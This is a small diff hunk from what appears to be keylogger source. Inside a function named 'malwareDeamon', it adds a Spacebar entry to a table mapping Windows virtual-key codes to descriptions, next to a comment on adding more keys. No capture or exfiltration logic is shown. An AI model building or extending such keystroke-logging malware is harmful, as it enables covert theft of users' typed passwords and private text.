@@ -75,6 +75,7 @@ void malwareDeamon() {
 	m.add(VK_SEPARATOR, "Seperator");
 	m.add(VK_SUBTRACT, "-");
 	m.add(VK_DECIMAL, "Decimal");
+	m.add(VK_SPACE, "Spacebar");
 	//ADD ADDITIONAL KEYS HERE WITH m.add(keycode, "Description") or a ASCII range with m.hephistus(start, end);
 	//KEYCODES: https://docs.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
 
